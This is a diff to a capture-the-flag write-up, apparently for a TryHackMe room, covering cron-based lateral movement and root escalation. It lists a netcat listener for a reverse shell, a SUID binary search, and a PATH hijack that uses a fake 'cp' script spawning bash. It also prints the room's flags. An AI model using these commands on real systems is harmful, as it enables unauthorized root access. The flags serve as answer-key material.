@@ -53,5 +53,31 @@ thm{explo1t1ng_lf1}
 ```
 thm{lf1_t0_rc3_1s_tr1cky}
 ```
-Task 3
-Root the machine
+## Task 3. Root the machine
+Do privilege escalation 
+### Get User 2 flag 
+* ```cat /etc/crontab```
+* ```nc -lvnp 4445```
+* ```ls -la```
+* ```cat helloworld.sh```
+* ```cd secret```
+* ```ls```
+* ```cat user2.txt```
+```
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+```
+### Root the machine and find the root flag
+* ```find /* -type f -perm -u=s 2>/dev/null```
+* ```touch cp```
+* ```nano cp```
+* ```cat cp```
+* ```#!/bin/bash```
+* ```/bin/bash```
+* ```chmod +x cp```
+* ```export PATH=/home/archangel/secret:$PATH```
+* ```./backup```
+* ```cat /root/root.txt```
+```
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+```
+### Done 🙂
